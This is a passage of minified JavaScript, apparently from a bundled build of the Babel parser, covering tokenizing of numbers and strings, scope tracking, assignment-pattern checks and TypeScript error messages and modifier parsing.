z=this.input.charCodeAt(this.state.pos);if(z===110)++this.state.pos,Y=!0;else if(z===109)throw this.raise(b.InvalidDecimal,Q);if(N6(this.codePointAtPos(this.state.pos)))throw this.raise(b.NumberIdentifier,this.state.curPosition());if(Y){let G=this.input.slice(J,this.state.pos).replace(/[_n]/g,"");this.finishToken(136,G);return}this.finishToken(135,W)}readNumber(X){let J=this.state.pos,Q=this.state.curPosition(),Y=!1,W=!1,z=!1,G=!1;if(!X&&this.readInt(10)===null)this.raise(b.InvalidNumber,this.state.curPosition());let H=this.state.pos-J>=2&&this.input.charCodeAt(J)===48;if(H){let Z=this.input.slice(J,this.state.pos);if(this.recordStrictModeErrors(b.StrictOctalLiteral,Q),!this.state.strict){let M=Z.indexOf("_");if(M>0)this.raise(b.ZeroDigitNumericSeparator,C9(Q,M))}G=H&&!/[89]/.test(Z)}let U=this.input.charCodeAt(this.state.pos);if(U===46&&!G)++this.state.pos,this.readInt(10),Y=!0,U=this.input.charCodeAt(this.state.pos);if((U===69||U===101)&&!G){if(U=this.input.charCodeAt(++this.state.pos),U===43||U===45)++this.state.pos;if(this.readInt(10)===null)this.raise(b.InvalidOrMissingExponent,Q);Y=!0,z=!0,U=this.input.charCodeAt(this.state.pos)}if(U===110){if(Y||H)this.raise(b.InvalidBigIntLiteral,Q);++this.state.pos,W=!0}if(U===109){if(this.expectPlugin("decimal",this.state.curPosition()),z||H)this.raise(b.InvalidDecimal,Q);++this.state.pos;var K=!0}if(N6(this.codePointAtPos(this.state.pos)))throw this.raise(b.NumberIdentifier,this.state.curPosition());let V=this.input.slice(J,this.state.pos).replace(/[_mn]/g,"");if(W){this.finishToken(136,V);return}if(K){this.finishToken(137,V);return}let B=G?parseInt(V,8):parseFloat(V);this.finishToken(135,B)}readCodePoint(X){let{code:J,pos:Q}=GV(this.input,this.state.pos,this.state.lineStart,this.state.curLine,X,this.errorHandlers_readCodePoint);return this.state.pos=Q,J}readString(X){let{str:J,pos:Q,curLine:Y,lineStart:W}=fK(X===34?"double":"single",this.input,this.state.pos+1,this.state.lineStart,this.state.curLine,this.errorHandlers_readStringContents_string);this.state.pos=Q+1,this.state.lineStart=W,this.state.curLine=Y,this.finishToken(134,J)}readTemplateContinuation(){if(!this.match(8))this.unexpected(null,8);this.state.pos--,this.readTemplateToken()}readTemplateToken(){let X=this.input[this.state.pos],{str:J,firstInvalidLoc:Q,pos:Y,curLine:W,lineStart:z}=fK("template",this.input,this.state.pos+1,this.state.lineStart,this.state.curLine,this.errorHandlers_readStringContents_template);if(this.state.pos=Y+1,this.state.lineStart=z,this.state.curLine=W,Q)this.state.firstInvalidTemplateEscapePos=new L6(Q.curLine,Q.pos-Q.lineStart,this.sourceToOffsetPos(Q.pos));if(this.input.codePointAt(Y)===96)this.finishToken(24,Q?null:X+J+"`");else this.state.pos++,this.finishToken(25,Q?null:X+J+"${")}recordStrictModeErrors(X,J){let Q=J.index;if(this.state.strict&&!this.state.strictErrors.has(Q))this.raise(X,J);else this.state.strictErrors.set(Q,[X,J])}readWord1(X){this.state.containsEsc=!1;let J="",Q=this.state.pos,Y=this.state.pos;if(X!==void 0)this.state.pos+=X<=65535?1:2;while(this.state.pos<this.length){let W=this.codePointAtPos(this.state.pos);if(fJ(W))this.state.pos+=W<=65535?1:2;else if(W===92){this.state.containsEsc=!0,J+=this.input.slice(Y,this.state.pos);let z=this.state.curPosition(),G=this.state.pos===Q?N6:fJ;if(this.input.charCodeAt(++this.state.pos)!==117){this.raise(b.MissingUnicodeEscape,this.state.curPosition()),Y=this.state.pos-1;continue}++this.state.pos;let H=this.readCodePoint(!0);if(H!==null){if(!G(H))this.raise(b.EscapedCharNotAnIdentifier,z);J+=String.fromCodePoint(H)}Y=this.state.pos}else break}return J+this.input.slice(Y,this.state.pos)}readWord(X){let J=this.readWord1(X),Q=aY.get(J);if(Q!==void 0)this.finishToken(Q,r6(Q));else this.finishToken(132,J)}checkKeywordEscapes(){let{type:X}=this.state;if(JW(X)&&this.state.containsEsc)this.raise(b.InvalidEscapedReservedWord,this.state.startLoc,{reservedWord:r6(X)})}raise(X,J,Q={}){let Y=J instanceof L6?J:J.loc.start,W=X(Y,Q);if(!(this.optionFlags&2048))throw W;if(!this.isLookahead)this.state.errors.push(W);return W}raiseOverwrite(X,J,Q={}){let Y=J instanceof L6?J:J.loc.start,W=Y.index,z=this.state.errors;for(let G=z.length-1;G>=0;G--){let H=z[G];if(H.loc.index===W)return z[G]=X(Y,Q);if(H.loc.index<W)break}return this.raise(X,J,Q)}updateContext(X){}unexpected(X,J){throw this.raise(b.UnexpectedToken,X!=null?X:this.state.startLoc,{expected:J?r6(J):null})}expectPlugin(X,J){if(this.hasPlugin(X))return!0;throw this.raise(b.MissingPlugin,J!=null?J:this.state.startLoc,{missingPlugin:[X]})}expectOnePlugin(X){if(!X.some((J)=>this.hasPlugin(J)))throw this.raise(b.MissingOneOfPlugins,this.state.startLoc,{missingPlugin:X})}errorBuilder(X){return(J,Q,Y)=>{this.raise(X,Z5(J,Q,Y))}}}class HV{constructor(){this.privateNames=new Set,this.loneAccessors=new Map,this.undefinedPrivateNames=new Map}}class UV{constructor(X){this.parser=void 0,this.stack=[],this.undefinedPrivateNames=new Map,this.parser=X}current(){return this.stack[this.stack.length-1]}enter(){this.stack.push(new HV)}exit(){let X=this.stack.pop(),J=this.current();for(let[Q,Y]of Array.from(X.undefinedPrivateNames))if(J){if(!J.undefinedPrivateNames.has(Q))J.undefinedPrivateNames.set(Q,Y)}else this.parser.raise(b.InvalidPrivateFieldResolution,Y,{identifierName:Q})}declarePrivateName(X,J,Q){let{privateNames:Y,loneAccessors:W,undefinedPrivateNames:z}=this.current(),G=Y.has(X);if(J&3){let H=G&&W.get(X);if(H){let U=H&4,K=J&4,V=H&3,B=J&3;if(G=V===B||U!==K,!G)W.delete(X)}else if(!G)W.set(X,J)}if(G)this.parser.raise(b.PrivateNameRedeclaration,Q,{identifierName:X});Y.add(X),z.delete(X)}usePrivateName(X,J){let Q;for(Q of this.stack)if(Q.privateNames.has(X))return;if(Q)Q.undefinedPrivateNames.set(X,J);else this.parser.raise(b.InvalidPrivateFieldResolution,J,{identifierName:X})}}class L5{constructor(X=0){this.type=X}canBeArrowParameterDeclaration(){return this.type===2||this.type===1}isCertainlyParameterDeclaration(){return this.type===3}}class GW extends L5{constructor(X){super(X);this.declarationErrors=new Map}recordDeclarationError(X,J){let Q=J.index;this.declarationErrors.set(Q,[X,J])}clearDeclarationError(X){this.declarationErrors.delete(X)}iterateErrors(X){this.declarationErrors.forEach(X)}}class KV{constructor(X){this.parser=void 0,this.stack=[new L5],this.parser=X}enter(X){this.stack.push(X)}exit(){this.stack.pop()}recordParameterInitializerError(X,J){let Q=J.loc.start,{stack:Y}=this,W=Y.length-1,z=Y[W];while(!z.isCertainlyParameterDeclaration()){if(z.canBeArrowParameterDeclaration())z.recordDeclarationError(X,Q);else return;z=Y[--W]}this.parser.raise(X,Q)}recordArrowParameterBindingError(X,J){let{stack:Q}=this,Y=Q[Q.length-1],W=J.loc.start;if(Y.isCertainlyParameterDeclaration())this.parser.raise(X,W);else if(Y.canBeArrowParameterDeclaration())Y.recordDeclarationError(X,W);else return}recordAsyncArrowParametersError(X){let{stack:J}=this,Q=J.length-1,Y=J[Q];while(Y.canBeArrowParameterDeclaration()){if(Y.type===2)Y.recordDeclarationError(b.AwaitBindingIdentifier,X);Y=J[--Q]}}validateAsPattern(){let{stack:X}=this,J=X[X.length-1];if(!J.canBeArrowParameterDeclaration())return;J.iterateErrors(([Q,Y])=>{this.parser.raise(Q,Y);let W=X.length-2,z=X[W];while(z.canBeArrowParameterDeclaration())z.clearDeclarationError(Y.index),z=X[--W]})}}function D_(){return new L5(3)}function w_(){return new GW(1)}function I_(){return new GW(2)}function VV(){return new L5}class BV extends zV{addExtra(X,J,Q,Y=!0){if(!X)return;let{extra:W}=X;if(W==null)W={},X.extra=W;if(Y)W[J]=Q;else Object.defineProperty(W,J,{enumerable:Y,value:Q})}isContextual(X){return this.state.type===X&&!this.state.containsEsc}isUnparsedContextual(X,J){if(this.input.startsWith(J,X)){let Q=this.input.charCodeAt(X+J.length);return!(fJ(Q)||(Q&64512)===55296)}return!1}isLookaheadContextual(X){let J=this.nextTokenStart();return this.isUnparsedContextual(J,X)}eatContextual(X){if(this.isContextual(X))return this.next(),!0;return!1}expectContextual(X,J){if(!this.eatContextual(X)){if(J!=null)throw this.raise(J,this.state.startLoc);this.unexpected(null,X)}}canInsertSemicolon(){return this.match(140)||this.match(8)||this.hasPrecedingLineBreak()}hasPrecedingLineBreak(){return vK(this.input,this.offsetToSourcePos(this.state.lastTokEndLoc.index),this.state.start)}hasFollowingLineBreak(){return vK(this.input,this.state.end,this.nextTokenStart())}isLineTerminator(){return this.eat(13)||this.canInsertSemicolon()}semicolon(X=!0){if(X?this.isLineTerminator():this.eat(13))return;this.raise(b.MissingSemicolon,this.state.lastTokEndLoc)}expect(X,J){if(!this.eat(X))this.unexpected(J,X)}tryParse(X,J=this.state.clone()){let Q={node:null};try{let Y=X((W=null)=>{throw Q.node=W,Q});if(this.state.errors.length>J.errors.length){let W=this.state;return this.state=J,this.state.tokensLength=W.tokensLength,{node:Y,error:W.errors[J.errors.length],thrown:!1,aborted:!1,failState:W}}return{node:Y,error:null,thrown:!1,aborted:!1,failState:null}}catch(Y){let W=this.state;if(this.state=J,Y instanceof SyntaxError)return{node:null,error:Y,thrown:!0,aborted:!1,failState:W};if(Y===Q)return{node:Q.node,error:null,thrown:!1,aborted:!0,failState:W};throw Y}}checkExpressionErrors(X,J){if(!X)return!1;let{shorthandAssignLoc:Q,doubleProtoLoc:Y,privateKeyLoc:W,optionalParametersLoc:z,voidPatternLoc:G}=X,H=!!Q||!!Y||!!z||!!W||!!G;if(!J)return H;if(Q!=null)this.raise(b.InvalidCoverInitializedName,Q);if(Y!=null)this.raise(b.DuplicateProto,Y);if(W!=null)this.raise(b.UnexpectedPrivateField,W);if(z!=null)this.unexpected(z);if(G!=null)this.raise(b.InvalidCoverDiscardElement,G)}isLiteralPropertyName(){return lK(this.state.type)}isPrivateName(X){return X.type==="PrivateName"}getPrivateNameSV(X){return X.id.name}hasPropertyAsPrivateName(X){return(X.type==="MemberExpression"||X.type==="OptionalMemberExpression")&&this.isPrivateName(X.property)}isObjectProperty(X){return X.type==="ObjectProperty"}isObjectMethod(X){return X.type==="ObjectMethod"}initializeScopes(X=this.options.sourceType==="module"){let J=this.state.labels;this.state.labels=[];let Q=this.exportedIdentifiers;this.exportedIdentifiers=new Set;let Y=this.inModule;this.inModule=X;let W=this.scope,z=this.getScopeHandler();this.scope=new z(this,X);let G=this.prodParam;this.prodParam=new XV;let H=this.classScope;this.classScope=new UV(this);let U=this.expressionScope;return this.expressionScope=new KV(this),()=>{this.state.labels=J,this.exportedIdentifiers=Q,this.inModule=Y,this.scope=W,this.prodParam=G,this.classScope=H,this.expressionScope=U}}enterInitialScopes(){let X=0;if(this.inModule||this.optionFlags&1)X|=2;if(this.optionFlags&32)X|=1;let J=!this.inModule&&this.options.sourceType==="commonjs";if(J||this.optionFlags&2)X|=4;this.prodParam.enter(X);let Q=J?514:1;if(this.optionFlags&4)Q|=512;this.scope.enter(Q)}checkDestructuringPrivate(X){let{privateKeyLoc:J}=X;if(J!==null)this.expectPlugin("destructuringPrivate",J)}}class O5{constructor(){this.shorthandAssignLoc=null,this.doubleProtoLoc=null,this.privateKeyLoc=null,this.optionalParametersLoc=null,this.voidPatternLoc=null}}class N5{constructor(X,J,Q){if(this.type="",this.start=J,this.end=0,this.loc=new R5(Q),(X==null?void 0:X.optionFlags)&128)this.range=[J,0];if(X!=null&&X.filename)this.loc.filename=X.filename}}var rY=N5.prototype;rY.__clone=function(){let X=new N5(void 0,this.start,this.loc.start),J=Object.keys(this);for(let Q=0,Y=J.length;Q<Y;Q++){let W=J[Q];if(W!=="leadingComments"&&W!=="trailingComments"&&W!=="innerComments")X[W]=this[W]}return X};class qV extends BV{startNode(){let X=this.state.startLoc;return new N5(this,X.index,X)}startNodeAt(X){return new N5(this,X.index,X)}startNodeAtNode(X){return this.startNodeAt(X.loc.start)}finishNode(X,J){return this.finishNodeAt(X,J,this.state.lastTokEndLoc)}finishNodeAt(X,J,Q){if(X.type=J,X.end=Q.index,X.loc.end=Q,this.optionFlags&128)X.range[1]=Q.index;if(this.optionFlags&4096)this.processComment(X);return X}resetStartLocation(X,J){if(X.start=J.index,X.loc.start=J,this.optionFlags&128)X.range[0]=J.index}resetEndLocation(X,J=this.state.lastTokEndLoc){if(X.end=J.index,X.loc.end=J,this.optionFlags&128)X.range[1]=J.index}resetStartLocationFromNode(X,J){this.resetStartLocation(X,J.loc.start)}castNodeTo(X,J){return X.type=J,X}cloneIdentifier(X){let{type:J,start:Q,end:Y,loc:W,range:z,name:G}=X,H=Object.create(rY);if(H.type=J,H.start=Q,H.end=Y,H.loc=W,H.range=z,H.name=G,X.extra)H.extra=X.extra;return H}cloneStringLiteral(X){let{type:J,start:Q,end:Y,loc:W,range:z,extra:G}=X,H=Object.create(rY);return H.type=J,H.start=Q,H.end=Y,H.loc=W,H.range=z,H.extra=G,H.value=X.value,H}}var ZV=(X)=>{return X.type==="ParenthesizedExpression"?ZV(X.expression):X};class MV extends qV{toAssignable(X,J=!1){var Q,Y;let W=void 0;if(X.type==="ParenthesizedExpression"||(Q=X.extra)!=null&&Q.parenthesized)if(W=ZV(X),J){if(W.type==="Identifier")this.expressionScope.recordArrowParameterBindingError(b.InvalidParenthesizedAssignment,X);else if(W.type!=="MemberExpression"&&!this.isOptionalMemberExpression(W))this.raise(b.InvalidParenthesizedAssignment,X)}else this.raise(b.InvalidParenthesizedAssignment,X);switch(X.type){case"Identifier":case"ObjectPattern":case"ArrayPattern":case"AssignmentPattern":case"RestElement":case"VoidPattern":break;case"ObjectExpression":this.castNodeTo(X,"ObjectPattern");for(let G=0,H=X.properties.length,U=H-1;G<H;G++){var z;let K=X.properties[G],V=G===U;if(this.toAssignableObjectExpressionProp(K,V,J),V&&K.type==="RestElement"&&(z=X.extra)!=null&&z.trailingCommaLoc)this.raise(b.RestTrailingComma,X.extra.trailingCommaLoc)}break;case"ObjectProperty":{let{key:G,value:H}=X;if(this.isPrivateName(G))this.classScope.usePrivateName(this.getPrivateNameSV(G),G.loc.start);this.toAssignable(H,J);break}case"SpreadElement":throw new Error("Internal @babel/parser error (this is a bug, please report it). SpreadElement should be converted by .toAssignable's caller.");case"ArrayExpression":this.castNodeTo(X,"ArrayPattern"),this.toAssignableList(X.elements,(Y=X.extra)==null?void 0:Y.trailingCommaLoc,J);break;case"AssignmentExpression":if(X.operator!=="=")this.raise(b.MissingEqInAssignment,X.left.loc.end);if(this.castNodeTo(X,"AssignmentPattern"),delete X.operator,X.left.type==="VoidPattern")this.raise(b.VoidPatternInitializer,X.left);this.toAssignable(X.left,J);break;case"ParenthesizedExpression":this.toAssignable(W,J);break}}toAssignableObjectExpressionProp(X,J,Q){if(X.type==="ObjectMethod")this.raise(X.kind==="get"||X.kind==="set"?b.PatternHasAccessor:b.PatternHasMethod,X.key);else if(X.type==="SpreadElement"){this.castNodeTo(X,"RestElement");let Y=X.argument;if(this.checkToRestConversion(Y,!1),this.toAssignable(Y,Q),!J)this.raise(b.RestTrailingComma,X)}else this.toAssignable(X,Q)}toAssignableList(X,J,Q){let Y=X.length-1;for(let W=0;W<=Y;W++){let z=X[W];if(!z)continue;if(this.toAssignableListItem(X,W,Q),z.type==="RestElement"){if(W<Y)this.raise(b.RestTrailingComma,z);else if(J)this.raise(b.RestTrailingComma,J)}}}toAssignableListItem(X,J,Q){let Y=X[J];if(Y.type==="SpreadElement"){this.castNodeTo(Y,"RestElement");let W=Y.argument;this.checkToRestConversion(W,!0),this.toAssignable(W,Q)}else this.toAssignable(Y,Q)}isAssignable(X,J){switch(X.type){case"Identifier":case"ObjectPattern":case"ArrayPattern":case"AssignmentPattern":case"RestElement":case"VoidPattern":return!0;case"ObjectExpression":{let Q=X.properties.length-1;return X.properties.every((Y,W)=>{return Y.type!=="ObjectMethod"&&(W===Q||Y.type!=="SpreadElement")&&this.isAssignable(Y)})}case"ObjectProperty":return this.isAssignable(X.value);case"SpreadElement":return this.isAssignable(X.argument);case"ArrayExpression":return X.elements.every((Q)=>Q===null||this.isAssignable(Q));case"AssignmentExpression":return X.operator==="=";case"ParenthesizedExpression":return this.isAssignable(X.expression);case"MemberExpression":case"OptionalMemberExpression":return!J;default:return!1}}toReferencedList(X,J){return X}toReferencedListDeep(X,J){this.toReferencedList(X,J);for(let Q of X)if((Q==null?void 0:Q.type)==="ArrayExpression")this.toReferencedListDeep(Q.elements)}parseSpread(X){let J=this.startNode();return this.next(),J.argument=this.parseMaybeAssignAllowIn(X,void 0),this.finishNode(J,"SpreadElement")}parseRestBinding(){let X=this.startNode();this.next();let J=this.parseBindingAtom();if(J.type==="VoidPattern")this.raise(b.UnexpectedVoidPattern,J);return X.argument=J,this.finishNode(X,"RestElement")}parseBindingAtom(){switch(this.state.type){case 0:{let X=this.startNode();return this.next(),X.elements=this.parseBindingList(3,93,1),this.finishNode(X,"ArrayPattern")}case 5:return this.parseObjectLike(8,!0);case 88:return this.parseVoidPattern(null)}return this.parseIdentifier()}parseBindingList(X,J,Q){let Y=Q&1,W=[],z=!0;while(!this.eat(X)){if(z)z=!1;else this.expect(12);if(Y&&this.match(12))W.push(null);else if(this.eat(X))break;else if(this.match(21)){let G=this.parseRestBinding();if(this.hasPlugin("flow")||Q&2)G=this.parseFunctionParamType(G);if(W.push(G),!this.checkCommaAfterRest(J)){this.expect(X);break}}else{let G=[];if(Q&2){if(this.match(26)&&this.hasPlugin("decorators"))this.raise(b.UnsupportedParameterDecorator,this.state.startLoc);while(this.match(26))G.push(this.parseDecorator())}W.push(this.parseBindingElement(Q,G))}}return W}parseBindingRestProperty(X){if(this.next(),this.hasPlugin("discardBinding")&&this.match(88))X.argument=this.parseVoidPattern(null),this.raise(b.UnexpectedVoidPattern,X.argument);else X.argument=this.parseIdentifier();return this.checkCommaAfterRest(125),this.finishNode(X,"RestElement")}parseBindingProperty(){let{type:X,startLoc:J}=this.state;if(X===21)return this.parseBindingRestProperty(this.startNode());let Q=this.startNode();if(X===139)this.expectPlugin("destructuringPrivate",J),this.classScope.usePrivateName(this.state.value,J),Q.key=this.parsePrivateName();else this.parsePropertyName(Q);return Q.method=!1,this.parseObjPropValue(Q,J,!1,!1,!0,!1)}parseBindingElement(X,J){let Q=this.parseMaybeDefault();if(this.hasPlugin("flow")||X&2)this.parseFunctionParamType(Q);if(J.length)Q.decorators=J,this.resetStartLocationFromNode(Q,J[0]);return this.parseMaybeDefault(Q.loc.start,Q)}parseFunctionParamType(X){return X}parseMaybeDefault(X,J){if(X!=null||(X=this.state.startLoc),J=J!=null?J:this.parseBindingAtom(),!this.eat(29))return J;let Q=this.startNodeAt(X);if(J.type==="VoidPattern")this.raise(b.VoidPatternInitializer,J);return Q.left=J,Q.right=this.parseMaybeAssignAllowIn(),this.finishNode(Q,"AssignmentPattern")}isValidLVal(X,J,Q){switch(X){case"AssignmentPattern":return"left";case"RestElement":return"argument";case"ObjectProperty":return"value";case"ParenthesizedExpression":return"expression";case"ArrayPattern":return"elements";case"ObjectPattern":return"properties";case"VoidPattern":return!0}return!1}isOptionalMemberExpression(X){return X.type==="OptionalMemberExpression"}checkLVal(X,J,Q=64,Y=!1,W=!1,z=!1){var G;let H=X.type;if(this.isObjectMethod(X))return;let U=this.isOptionalMemberExpression(X);if(U||H==="MemberExpression"){if(U){if(this.expectPlugin("optionalChainingAssign",X.loc.start),J.type!=="AssignmentExpression")this.raise(b.InvalidLhsOptionalChaining,X,{ancestor:J})}if(Q!==64)this.raise(b.InvalidPropertyBindingPattern,X);return}if(H==="Identifier"){this.checkIdentifier(X,Q,W);let{name:F}=X;if(Y)if(Y.has(F))this.raise(b.ParamDupe,X);else Y.add(F);return}else if(H==="VoidPattern"&&J.type==="CatchClause")this.raise(b.VoidPatternCatchClauseParam,X);let K=this.isValidLVal(H,!(z||(G=X.extra)!=null&&G.parenthesized)&&J.type==="AssignmentExpression",Q);if(K===!0)return;if(K===!1){let F=Q===64?b.InvalidLhs:b.InvalidLhsBinding;this.raise(F,X,{ancestor:J});return}let V,B;if(typeof K==="string")V=K,B=H==="ParenthesizedExpression";else[V,B]=K;let Z=H==="ArrayPattern"||H==="ObjectPattern"?{type:H}:J,M=X[V];if(Array.isArray(M)){for(let F of M)if(F)this.checkLVal(F,Z,Q,Y,W,B)}else if(M)this.checkLVal(M,Z,Q,Y,W,B)}checkIdentifier(X,J,Q=!1){if(this.state.strict&&(Q?aK(X.name,this.inModule):nK(X.name)))if(J===64)this.raise(b.StrictEvalArguments,X,{referenceName:X.name});else this.raise(b.StrictEvalArgumentsBinding,X,{bindingName:X.name});if(J&8192&&X.name==="let")this.raise(b.LetInLexicalBinding,X);if(!(J&64))this.declareNameFromIdentifier(X,J)}declareNameFromIdentifier(X,J){this.scope.declareName(X.name,J,X.loc.start)}checkToRestConversion(X,J){switch(X.type){case"ParenthesizedExpression":this.checkToRestConversion(X.expression,J);break;case"Identifier":case"MemberExpression":break;case"ArrayExpression":case"ObjectExpression":if(J)break;default:this.raise(b.InvalidRestAssignmentPattern,X)}}checkCommaAfterRest(X){if(!this.match(12))return!1;return this.raise(this.lookaheadCharCode()===X?b.RestTrailingComma:b.ElementAfterRest,this.state.startLoc),!0}}function C_(X){if(X==null)throw new Error(`Unexpected ${X} value.`);return X}function gK(X){if(!X)throw new Error("Assert fail")}var E1=r8`typescript`({AbstractMethodHasImplementation:({methodName:X})=>`Method '${X}' cannot have an implementation because it is marked abstract.`,AbstractPropertyHasInitializer:({propertyName:X})=>`Property '${X}' cannot have an initializer because it is marked abstract.`,AccessorCannotBeOptional:"An 'accessor' property cannot be declared optional.",AccessorCannotDeclareThisParameter:"'get' and 'set' accessors cannot declare 'this' parameters.",AccessorCannotHaveTypeParameters:"An accessor cannot have type parameters.",ClassMethodHasDeclare:"Class methods cannot have the 'declare' modifier.",ClassMethodHasReadonly:"Class methods cannot have the 'readonly' modifier.",ConstInitializerMustBeStringOrNumericLiteralOrLiteralEnumReference:"A 'const' initializer in an ambient context must be a string or numeric literal or literal enum reference.",ConstructorHasTypeParameters:"Type parameters cannot appear on a constructor declaration.",DeclareAccessor:({kind:X})=>`'declare' is not allowed in ${X}ters.`,DeclareClassFieldHasInitializer:"Initializers are not allowed in ambient contexts.",DeclareFunctionHasImplementation:"An implementation cannot be declared in ambient contexts.",DuplicateAccessibilityModifier:({modifier:X})=>`Accessibility modifier already seen: '${X}'.`,DuplicateModifier:({modifier:X})=>`Duplicate modifier: '${X}'.`,EmptyHeritageClauseType:({token:X})=>`'${X}' list cannot be empty.`,EmptyTypeArguments:"Type argument list cannot be empty.",EmptyTypeParameters:"Type parameter list cannot be empty.",ExpectedAmbientAfterExportDeclare:"'export declare' must be followed by an ambient declaration.",ImportAliasHasImportType:"An import alias can not use 'import type'.",ImportReflectionHasImportType:"An `import module` declaration can not use `type` modifier",IncompatibleModifiers:({modifiers:X})=>`'${X[0]}' modifier cannot be used with '${X[1]}' modifier.`,IndexSignatureHasAbstract:"Index signatures cannot have the 'abstract' modifier.",IndexSignatureHasAccessibility:({modifier:X})=>`Index signatures cannot have an accessibility modifier ('${X}').`,IndexSignatureHasDeclare:"Index signatures cannot have the 'declare' modifier.",IndexSignatureHasOverride:"'override' modifier cannot appear on an index signature.",IndexSignatureHasStatic:"Index signatures cannot have the 'static' modifier.",InitializerNotAllowedInAmbientContext:"Initializers are not allowed in ambient contexts.",InvalidHeritageClauseType:({token:X})=>`'${X}' list can only include identifiers or qualified-names with optional type arguments.`,InvalidModifierOnAwaitUsingDeclaration:(X)=>`'${X}' modifier cannot appear on an await using declaration.`,InvalidModifierOnTypeMember:({modifier:X})=>`'${X}' modifier cannot appear on a type member.`,InvalidModifierOnTypeParameter:({modifier:X})=>`'${X}' modifier cannot appear on a type parameter.`,InvalidModifierOnTypeParameterPositions:({modifier:X})=>`'${X}' modifier can only appear on a type parameter of a class, interface or type alias.`,InvalidModifierOnUsingDeclaration:(X)=>`'${X}' modifier cannot appear on a using declaration.`,InvalidModifiersOrder:({orderedModifiers:X})=>`'${X[0]}' modifier must precede '${X[1]}' modifier.`,InvalidPropertyAccessAfterInstantiationExpression:"Invalid property access after an instantiation expression. You can either wrap the instantiation expression in parentheses, or delete the type arguments.",InvalidTupleMemberLabel:"Tuple members must be labeled with a simple identifier.",MissingInterfaceName:"'interface' declarations must be followed by an identifier.",NonAbstractClassHasAbstractMethod:"Abstract methods can only appear within an abstract class.",NonClassMethodPropertyHasAbstractModifier:"'abstract' modifier can only appear on a class, method, or property declaration.",OptionalTypeBeforeRequired:"A required element cannot follow an optional element.",OverrideNotInSubClass:"This member cannot have an 'override' modifier because its containing class does not extend another class.",PatternIsOptional:"A binding pattern parameter cannot be optional in an implementation signature.",PrivateElementHasAbstract:"Private elements cannot have the 'abstract' modifier.",PrivateElementHasAccessibility:({modifier:X})=>`Private elements cannot have an accessibility modifier ('${X}').`,ReadonlyForMethodSignature:"'readonly' modifier can only appear on a property declaration or index signature.",ReservedArrowTypeParam:"This syntax is reserved in files with the .mts or .cts extension. Add a trailing comma, as in `<T,>() => ...`.",ReservedTypeAssertion:"This syntax is reserved in files with the .mts or .cts extension. Use an `as` expression instead.",SetAccessorCannotHaveOptionalParameter:"A 'set' accessor cannot have an optional parameter.",SetAccessorCannotHaveRestParameter:"A 'set' accessor cannot have rest parameter.",SetAccessorCannotHaveReturnType:"A 'set' accessor cannot have a return type annotation.",SingleTypeParameterWithoutTrailingComma:({typeParameterName:X})=>`Single type parameter ${X} should have a trailing comma. Example usage: <${X},>.`,StaticBlockCannotHaveModifier:"Static class blocks cannot have any modifier.",TupleOptionalAfterType:"A labeled tuple optional element must be declared using a question mark after the name and before the colon (`name?: type`), rather than after the type (`name: type?`).",TypeAnnotationAfterAssign:"Type annotations must come before default assignments, e.g. instead of `age = 25: number` use `age: number = 25`.",TypeImportCannotSpecifyDefaultAndNamed:"A type-only import can specify a default import or named bindings, but not both.",TypeModifierIsUsedInTypeExports:"The 'type' modifier cannot be used on a named export when 'export type' is used on its export statement.",TypeModifierIsUsedInTypeImports:"The 'type' modifier cannot be used on a named import when 'import type' is used on its import statement.",UnexpectedParameterModifier:"A parameter property is only allowed in a constructor implementation.",UnexpectedReadonly:"'readonly' type modifier is only permitted on array and tuple literal types.",UnexpectedTypeAnnotation:"Did not expect a type annotation here.",UnexpectedTypeCastInParameter:"Unexpected type cast in parameter position.",UnsupportedImportTypeArgument:"Argument in a type import must be a string literal.",UnsupportedParameterPropertyKind:"A parameter property may not be declared using a binding pattern.",UnsupportedSignatureParameterKind:({type:X})=>`Name in a signature must be an Identifier, ObjectPattern or ArrayPattern, instead got ${X}.`,UsingDeclarationInAmbientContext:(X)=>`'${X}' declarations are not allowed in ambient contexts.`});function P_(X){switch(X){case"any":return"TSAnyKeyword";case"boolean":return"TSBooleanKeyword";case"bigint":return"TSBigIntKeyword";case"never":return"TSNeverKeyword";case"number":return"TSNumberKeyword";case"object":return"TSObjectKeyword";case"string":return"TSStringKeyword";case"symbol":return"TSSymbolKeyword";case"undefined":return"TSUndefinedKeyword";case"unknown":return"TSUnknownKeyword";default:return}}function hK(X){return X==="private"||X==="public"||X==="protected"}function S_(X){return X==="in"||X==="out"}var T_=(X)=>class J extends X{constructor(...Q){super(...Q);this.tsParseInOutModifiers=this.tsParseModifiers.bind(this,{allowedModifiers:["in","out"],disallowedModifiers:["const","public","private","protected","readonly","declare","abstract","override"],errorTemplate:E1.InvalidModifierOnTypeParameter}),this.tsParseConstModifier=this.tsParseModifiers.bind(this,{allowedModifiers:["const"],disallowedModifiers:["in","out"],errorTemplate:E1.InvalidModifierOnTypeParameterPositions}),this.tsParseInOutConstModifiers=this.tsParseModifiers.bind(this,{allowedModifiers:["in","out","const"],disallowedModifiers:["public","private","protected","readonly","declare","abstract","override"],errorTemplate:E1.InvalidModifierOnTypeParameter})}getScopeHandler(){return eK}tsIsIdentifier(){return C0(this.state.type)}tsTokenCanFollowModifier(){return this.match(0)||this.match(5)||this.match(55)||this.match(21)||this.match(139)||this.isLiteralPropertyName()}tsNextTokenOnSameLineAndCanFollowModifier(){if(this.next(),this.hasPrecedingLineBreak())return!1;return this.tsTokenCanFollowModifier()}tsNextTokenCanFollowModifier(){if(this.match(106))return this.next(),this.tsTokenCanFollowModifier();return this.tsNextTokenOnSameLineAndCanFollowModifier()}tsParseModifier(Q,Y,W){if(!C0(this.state.type)&&this.state.type!==58&&this.state.type!==75)return;let z=this.state.value;if(Q.includes(z)){if(W&&this.match(106))return;if(Y&&this.tsIsStartOfStaticBlocks())return;if(this.tsTryParse(this.tsNextTokenCanFollowModifier.bind(this)))return z}return}tsParseModifiers({allowedModifiers:Q,disallowedModifiers:Y,stopOnStartOfClassStaticBlock:W,errorTemplate:z=E1.InvalidModifierOnTypeMember},G){let H=(K,V,B,Z)=>{if(V===B&&G[Z])this.raise(E1.InvalidModifiersOrder,K,{orderedModifiers:[B,Z]})},U=(K,V,B,Z)=>{if(G[B]&&V===Z||G[Z]&&V===B)this.raise(E1.IncompatibleModifiers,K,{modifiers:[B,Z]})};for(;;){let{startLoc:K}=this.state,V=this.tsParseModifier(Q.concat(Y!=null?Y:[]),W,G.static);if(!V)break;if(hK(V))if(G.accessibility)this.raise(E1.DuplicateAccessibilityModifier,K,{modifier:V});else H(K,V,V,"override"),H(K,V,V,"static"),H(K,V,V,"readonly"),G.accessibility=V;else 